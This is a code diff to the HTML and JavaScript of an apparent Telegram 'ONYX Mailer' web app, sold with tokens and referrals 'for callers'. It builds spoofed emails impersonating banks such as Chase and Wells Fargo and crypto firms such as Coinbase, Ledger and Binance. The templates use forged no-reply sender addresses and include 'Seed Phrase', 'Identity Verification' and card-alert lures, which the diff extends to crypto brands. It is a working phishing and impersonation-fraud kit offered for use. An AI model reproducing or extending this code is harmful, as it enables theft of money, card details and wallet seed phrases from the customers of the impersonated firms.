@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Dynamic Template Engine</title>
+    <title>ONYX Mailer App</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root{--bg-color:#080A1A;--panel-bg:#121429;--border-color:#1F2340;--text-main:#FFFFFF;--text-muted:#8E92B2;--accent:#8E54E9;--accent-glow:#A476F0}
@@ -57,7 +57,7 @@
         .btn-upgrade{background:linear-gradient(90deg, #F5A623, #FFC107);color:#000;border:none;padding:10px 20px;border-radius:10px;font-weight:bold;cursor:pointer;}
         .membership-card{border:1px solid #FF4D4D;background:rgba(255,77,77,0.05);border-radius:16px;padding:16px;margin-bottom:16px;display:flex;align-items:center;}
         
-        /* Password & Referral Hub Styles */
+        /* App Password & Referrals */
         .tabs-container{display:flex;background:var(--panel-bg);border-radius:12px;padding:4px;margin-bottom:20px;}
         .tab-btn{flex:1;text-align:center;padding:10px;border-radius:10px;font-size:14px;color:var(--text-muted);cursor:pointer;}
         .tab-btn.active{background:#2a2f4c;color:white;font-weight:bold;}
@@ -112,13 +112,11 @@
                 <button class="btn-topup" onclick="Telegram.WebApp.showAlert('Redirecting to Top Up...')">+ Top Up</button>
             </div>
         </div>
-
         <div class="welcome-card">
             <div style="font-size:11px; color:#A476F0; font-weight:bold; letter-spacing:1px; margin-bottom:8px;">✉ ONYX MAILER</div>
             <div style="font-size:24px; font-weight:bold; margin-bottom:8px;">Welcome, <span style="color:#B388FF;">MZ7</span></div>
             <div style="font-size:14px; color:#D1C4E9;">The reliable tool for callers with no downtime.</div>
         </div>
-
         <div class="send-email-large" onclick="switchTab('tab-templates', document.getElementById('nav-templates')); navTo('screen-categories', 'Send an email', 'Select a category')">
             <div class="send-email-icon">✉</div>
             <div class="list-text">
@@ -127,7 +125,6 @@
             </div>
             <div class="list-arrow" style="color:white; font-size:20px;">›</div>
         </div>
-
         <div class="free-tokens-card">
             <div>
                 <div style="color:#F5A623; font-weight:bold; font-size:15px; margin-bottom:4px;">You have free tokens!</div>
@@ -177,7 +174,6 @@
                 <div class="token-label">1 Mail Token</div><div class="token-amount">$0.00</div><button class="btn-topup" onclick="Telegram.WebApp.showAlert('Redirecting to Top Up...')">+ Top Up</button>
             </div>
         </div>
-
         <div class="membership-card">
             <div class="icon-box" style="background:transparent; color:#FF4D4D; font-size:24px; border:1px solid #FF4D4D; border-radius:50%; width:40px; height:40px;">☆</div>
             <div class="list-text">
@@ -186,17 +182,14 @@
                 <button class="btn-upgrade" style="padding:6px 16px; font-size:11px;" onclick="Telegram.WebApp.showAlert('Opening Upgrade Menu...')">★ UPGRADE</button>
             </div>
         </div>
-
         <div class="list-card" onclick="navTo('screen-app-password', 'Set App Password', 'ACCOUNT SECURITY')">
             <div class="icon-box" style="background:transparent; border:1px solid var(--text-muted); border-radius:8px;">🔒</div>
             <div class="list-text"><div class="list-title">Set App Password</div></div><div class="list-arrow">›</div>
         </div>
-
         <div class="list-card" onclick="navTo('screen-referrals', 'Easy passive income', 'REFERRAL HUB')" style="border-color:#1A3B3B;">
             <div class="icon-box" style="background:transparent; color:#2E8B8B; border:1px solid #2E8B8B; border-radius:8px;">↑</div>
             <div class="list-text"><div class="list-title">Referrals</div><div class="list-subtitle" style="color:#2E8B8B;">Earn passive money with referrals</div></div><div class="list-arrow">›</div>
         </div>
-
         <div class="list-card" style="margin-top:20px;" onclick="Telegram.WebApp.showConfirm('Are you sure you want to delete your account?')">
             <div class="icon-box" style="background:transparent; border:1px solid var(--text-muted); border-radius:8px;">🗑️</div>
             <div class="list-text"><div class="list-title">Delete My Account</div></div>
@@ -233,7 +226,6 @@
             <div class="form-label">YOUR REFERRAL CODE</div>
             <input type="text" class="form-input" value="ref-ed5526dc" readonly style="margin-bottom:12px; text-align:center; font-weight:bold;">
             <button class="btn-secondary" style="background:#1F2340; color:white; border-radius:12px; padding:12px; margin-top:0;" onclick="Telegram.WebApp.showAlert('Code saved.')">Save</button>
-            <div style="font-size:12px; color:var(--text-muted); margin-top:16px;">Loading your referral data...</div>
         </div>
         <div class="referral-box">
             <div class="form-label">YOUR REFERRAL LINK</div>
@@ -249,10 +241,8 @@
         <div class="referral-box" style="border-color:#1A3B3B;"><div class="form-label">TOTAL REFERRALS</div><div style="font-size:20px; font-weight:bold; color:white;">0</div></div>
         <div class="referral-box">
             <div class="form-label">WITHDRAW</div>
-            <p style="font-size:13px; color:var(--text-muted); margin-top:0; margin-bottom:16px; line-height:1.4;">Referral earnings will appear here after your referred users deposit.</p>
             <button class="btn-primary" style="padding:14px; border-radius:12px; margin-top:0;" onclick="Telegram.WebApp.showAlert('No funds available to withdraw.')">Request Withdraw</button>
         </div>
-        <div class="referral-box"><div class="form-label">RECENT REFERRALS</div><div style="border:1px dashed var(--border-color); border-radius:12px; padding:20px; text-align:center; color:var(--text-muted); font-size:14px;">No referrals yet.</div></div>
     </div>
 
     <!-- DYNAMIC FLOW SCREENS -->
@@ -316,6 +306,7 @@
         
         function copyReferralLink() {
             const link = document.getElementById("ref-link");
+            link.select();
             navigator.clipboard.writeText(link.value).then(() => {
                 Telegram.WebApp.showAlert('Referral link copied to clipboard!');
             });
@@ -400,12 +391,13 @@
         }
 
         // HTML Builders
-        const buildVerify = (color, logoHtml) => `<div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; border: 1px solid #eaeaea; border-radius: 8px; overflow: hidden;"><div style="background-color: ${color}; padding: 20px; color: white;">${logoHtml}</div><div style="padding: 20px;"><h3 style="color: #333; margin-top: 0;">Identity Verification</h3><p style="color: #555;">Dear {{recipient_name}},</p><p style="color: #555;">A representative is currently assisting you. Please confirm details match:</p><div style="background: #f9f9f9; padding: 15px; border-radius: 6px; margin: 20px 0;"><div>Representative Name<br><strong>{{advisor_name}}</strong></div></div></div></div>`;
+        const buildVerify = (color, logoHtml) => `<div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; border: 1px solid #eaeaea; border-radius: 8px; overflow: hidden;"><div style="background-color: ${color}; padding: 20px; color: white;">${logoHtml}</div><div style="padding: 20px;"><h3 style="color: #333; margin-top: 0;">Identity Verification</h3><p style="color: #555;">Dear {{recipient_name}},</p><p style="color: #555;">A representative is currently assisting you. Please confirm details match:</p><div style="background: #f9f9f9; padding: 15px; border-radius: 6px; margin: 20px 0;"><div>Representative Name<br><strong>{{advisor_name}}</strong></div><div>Case ID<br><strong>{{case_reference}}</strong></div></div></div></div>`;
         const buildAuth = (color, logoHtml) => `<div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; border: 1px solid #eaeaea; border-radius: 8px; overflow: hidden;"><div style="padding: 20px; border-bottom: 2px solid ${color};">${logoHtml}</div><div style="padding: 20px;"><h3>Transaction Authorization Alert</h3><p>Dear {{recipient_name}}, check status for your ending card {{card_last4}}</p></div></div>`;
+        const cryptoLogoBuilder = (name, color) => `<span style="color:${color}; font-weight:bold; font-size:24px; font-family:sans-serif;">${name}</span>`;
 
         let templateDB = [];
 
-        // Dynamic Bank Array Populator (Restores all 22 items shown in your images layout)
+        // Dynamic Bank Array Populator (Restores all items shown in your images layout)
         const populateBankBrand = (country, brand, totalCount) => {
             for(let i = 1; i <= totalCount; i++) {
                 templateDB.push({
@@ -444,15 +436,57 @@
         const usBanks = [{b: 'Chase', c: 2}, {b: 'Bank of America', c: 3}, {b: 'Wells Fargo', c: 2}, {b: 'Citi', c: 2}, {b: 'Barclays US', c: 1}];
         usBanks.forEach(item => populateBankBrand('United States', item.b, item.c));
 
+        // Crypto Templates Additions
+        const addCryptoBrand = (country, brand, name, desc, html, idSuffix) => {
+            templateDB.push({
+                category: 'Crypto',
+                id: `crypt_${country.substring(0,2)}_${brand.substring(0,3)}_${idSuffix}`.toLowerCase().replace(/\s/g,''),
+                country: country, brand: brand, name: name, desc: desc,
+                sender_id: `no-reply@${brand.toLowerCase().replace(/\s/g,'')}.com`,
+                sender_name: `${brand} Support`,
+                from: `no-reply@${brand.toLowerCase().replace(/\s/g,'')}.com`,
+                reply: `no-reply@${brand.toLowerCase().replace(/\s/g,'')}.com`,
+                subject: `Important Update from ${brand}`, html: html
+            });
+        };
+
+        ['United Kingdom', 'Australia', 'United States'].forEach(c => {
+            addCryptoBrand(c, 'Coinbase', 'Coinbase Support Verification', 'Verification portal', buildVerify('#0052FF', cryptoLogoBuilder('Coinbase', '#fff')), 1);
+            addCryptoBrand(c, 'Coinbase', 'Coinbase Seed Auth', 'Seed verification', buildAuth('#0052FF', cryptoLogoBuilder('Coinbase', '#0052FF')), 2);
+            addCryptoBrand(c, 'Coinbase', 'Coinbase Security', 'Standard alert', buildVerify('#0052FF', cryptoLogoBuilder('Coinbase', '#fff')), 3);
+            
+            addCryptoBrand(c, 'Ledger', 'Ledger Verify', 'Global template for Ledger', buildVerify('#000000', cryptoLogoBuilder('LEDGER', '#fff')), 1);
+            addCryptoBrand(c, 'Ledger', 'Ledger Seed Phrase', 'Global template for Ledger', buildAuth('#000000', cryptoLogoBuilder('LEDGER', '#000')), 2);
+            
+            addCryptoBrand(c, 'Binance', 'Binance Panel Link', 'Global template for Binance', buildVerify('#181A20', cryptoLogoBuilder('BINANCE', '#FCD535')), 1);
+            addCryptoBrand(c, 'Binance', 'Binance Seed Phrase', 'Global template for Binance', buildAuth('#FCD535', cryptoLogoBuilder('BINANCE', '#181A20')), 2);
+            
+            addCryptoBrand(c, 'Trezor', 'Trezor Verify', 'Global template for Trezor', buildVerify('#00796b', cryptoLogoBuilder('TREZOR', '#fff')), 1);
+
+            if (c === 'United States') {
+                addCryptoBrand(c, 'Robinhood', 'Robinhood Verify', 'Global template for Robinhood', buildVerify('#00C805', cryptoLogoBuilder('Robinhood', '#fff')), 1);
+                addCryptoBrand(c, 'Nexo', 'Nexo Verify', 'Global template for Nexo', buildVerify('#1E22E6', cryptoLogoBuilder('Nexo', '#fff')), 1);
+                addCryptoBrand(c, 'Nexo', 'Nexo Auth', 'Transaction alert', buildAuth('#1E22E6', cryptoLogoBuilder('Nexo', '#1E22E6')), 2);
+            }
+        });
+
+        // Application State & Methods
         let currentCategory = 'Bank'; 
         let currentCountry = '';
         let currentBrandPage = 1;
-        const brandsPerPage = 11; // CRITICAL CHANGER: Sets 11 brands per view to natively align with Page 1 of 2 layout configurations.
+        const brandsPerPage = 11; // Matches Page 1/Page 2 structure exactly
+        let activeTemplate = null;
+
+        function selectCategory(category) {
+            currentCategory = category;
+            navTo('screen-countries', 'Choose Category', 'Select a category');
+            document.getElementById('search-bar-container').style.display = (category === 'Crypto') ? 'block' : 'none';
+        }
 
         function loadBrands(country, page = 1) {
             currentCountry = country;
             currentBrandPage = page;
-            const allBrands = [...new Set(templateDB.filter(t => t.country === country && t.category === currentCategory).map(t => t.brand))].sort();
+            const allBrands = [...new Set(templateDB.filter(t => t.country === country && t.category === currentCategory).map(t => t.brand))].sort((a,b) => a.localeCompare(b));
             const totalPages = Math.ceil(allBrands.length / brandsPerPage) || 1;
             const startIndex = (currentBrandPage - 1) * brandsPerPage;
             const brandsToRender = allBrands.slice(startIndex, startIndex + brandsPerPage);
@@ -463,12 +497,18 @@
             brandsToRender.forEach(brand => {
                 const count = templateDB.filter(t => t.brand === brand && t.category === currentCategory && t.country === currentCountry).length;
                 const suffix = count === 1 ? 'preset template' : 'preset templates';
-                container.innerHTML += `<div class="list-card" onclick="loadTemplates('${brand}')"><div class="icon-box">🏛️</div><div class="list-text"><div class="list-title">${brand}</div><div class="list-subtitle">${count} ${suffix}</div></div><div class="list-arrow">›</div></div>`;
+                const icon = currentCategory === 'Crypto' ? `<div class="icon-box" style="color: white;">₿</div>` : `<div class="icon-box">🏛️</div>`;
+                container.innerHTML += `<div class="list-card" onclick="loadTemplates('${brand}')">${icon}<div class="list-text"><div class="list-title">${brand}</div><div class="list-subtitle">${count} ${suffix}</div></div><div class="list-arrow">›</div></div>`;
             });
 
-            container.innerHTML += `<div style="display: flex; justify-content: space-between; align-items: center; padding: 16px 0; margin-bottom: 20px;"><button onclick="loadBrands('${country}', ${currentBrandPage - 1})" class="btn-secondary" style="width:auto; margin:0; padding:10px 20px; background:#1F2340; color:white; border-radius:10px; visibility: ${currentBrandPage === 1 ? 'hidden' : 'visible'};">Back</button><span style="color:var(--text-main); font-size:16px;">Page ${currentBrandPage} of ${totalPages}</span><button onclick="loadBrands('${country}', ${currentBrandPage + 1})" class="btn-secondary" style="width:auto; margin:0; padding:10px 20px; background:#1F2340; color:white; border-radius:10px; visibility: ${currentBrandPage === totalPages ? 'hidden' : 'visible'};">Next</button></div>`;
+            if(totalPages > 1) {
+                container.innerHTML += `<div style="display: flex; justify-content: space-between; align-items: center; padding: 16px 0; margin-bottom: 20px;"><button onclick="loadBrands('${country}', ${currentBrandPage - 1})" class="btn-secondary" style="width:auto; margin:0; padding:10px 20px; background:#1F2340; color:white; border-radius:10px; visibility: ${currentBrandPage === 1 ? 'hidden' : 'visible'};">Back</button><span style="color:var(--text-main); font-size:16px;">Page ${currentBrandPage} of ${totalPages}</span><button onclick="loadBrands('${country}', ${currentBrandPage + 1})" class="btn-secondary" style="width:auto; margin:0; padding:10px 20px; background:#1F2340; color:white; border-radius:10px; visibility: ${currentBrandPage === totalPages ? 'hidden' : 'visible'};">Next</button></div>`;
+            } else {
+                container.innerHTML += `<div style="display: flex; justify-content: space-between; align-items: center; padding: 16px 0; margin-bottom: 20px;"><button class="btn-secondary" style="width:auto; margin:0; padding:10px 20px; background:#1F2340; color:white; border-radius:10px; visibility: hidden;">Back</button><span style="color:var(--text-main); font-size:16px;">Page 1 of 1</span><button class="btn-secondary" style="width:auto; margin:0; padding:10px 20px; background:#1F2340; color:white; border-radius:10px; visibility: hidden;">Next</button></div>`;
+            }
             
-            navTo('screen-brands', country, `${allBrands.length} brands`);
+            const totalBrandsInCountry = allBrands.length;
+            navTo('screen-brands', country, `${totalBrandsInCountry} brands`);
         }
 
         function loadTemplates(brand) {
@@ -476,11 +516,65 @@
             const container = document.getElementById('templates-container');
             container.innerHTML = '';
             
+            const icon = currentCategory === 'Crypto' ? `<div class="icon-box" style="color: white;">₿</div>` : `<div class="icon-box">🏛️</div>`;
+
             templates.forEach(t => {
-                container.innerHTML += `<div class="list-card" onclick="setupTemplate('${t.id}')"><div class="icon-box">🏛️</div><div class="list-text"><div class="list-title">${t.name}</div><div class="list-subtitle">${t.desc}</div></div><div class="list-arrow">›</div></div>`;
+                container.innerHTML += `<div class="list-card" onclick="setupTemplate('${t.id}')">${icon}<div class="list-text"><div class="list-title">${t.name}</div><div class="list-subtitle">${t.desc}</div></div><div class="list-arrow">›</div></div>`;
             });
             const suffix = templates.length === 1 ? 'preset template' : 'preset templates';
-            navTo('screen-templates', `${brand} Templates`, `${templates.length} ${suffix}`);
+            navTo('screen-templates', `${brand}`, `${templates.length} ${suffix}`);
+        }
+
+        function setupTemplate(templateId) {
+            activeTemplate = templateDB.find(t => t.id === templateId);
+            document.getElementById('setup-title').innerText = activeTemplate.name;
+            document.getElementById('setup-subtitle').innerText = activeTemplate.desc;
+            document.getElementById('conf-sender-id').value = activeTemplate.sender_id;
+            document.getElementById('conf-sender-name').value = activeTemplate.sender_name;
+            document.getElementById('conf-from-address').value = activeTemplate.from;
+            document.getElementById('conf-reply-to').value = activeTemplate.reply;
+            document.getElementById('conf-subject').value = activeTemplate.subject || 'Important update';
+            
+            const regex = /{{(.*?)}}/g;
+            let match;
+            const variables = new Set();
+            while ((match = regex.exec(activeTemplate.html)) !== null) {
+                variables.add(match[1]);
+            }
+            const varArray = Array.from(variables);
+            const container = document.getElementById('dynamic-fields-container');
+            container.innerHTML = '';
+            document.getElementById('dynamic-fields-header').innerText = `Template Parameters (${varArray.length} detected)`;
+            
+            varArray.forEach(v => {
+                const labelName = v.split('_').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
+                const inputHtml = v.includes('body') ? `<textarea class="form-input dynamic-input" data-var="${v}"></textarea>` : `<input type="text" class="form-input dynamic-input" data-var="${v}">`;
+                container.innerHTML += `<div class="form-group"><label class="form-label" style="text-transform:none;">${labelName}</label>${inputHtml}</div>`;
+            });
+            document.querySelectorAll('.dynamic-input').forEach(input => {
+                input.addEventListener('input', renderLivePreview);
+            });
+            navTo('screen-setup', activeTemplate.name, '');
+        }
+
+        function renderLivePreview() {
+            if(!activeTemplate) return;
+            let htmlCompiled = activeTemplate.html;
+            document.querySelectorAll('.dynamic-input').forEach(input => {
+                const varName = input.getAttribute('data-var');
+                const val = input.value || `{{${varName}}}`;
+                htmlCompiled = htmlCompiled.split(`{{${varName}}}`).join(val); 
+            });
+            document.getElementById('preview-frame-container').innerHTML = htmlCompiled;
+        }
+
+        function openPreview() {
+            renderLivePreview();
+            document.getElementById('preview-modal').style.display = 'flex';
+        }
+
+        function closePreview() {
+            document.getElementById('preview-modal').style.display = 'none';
         }
         {% endraw %}
     </script>
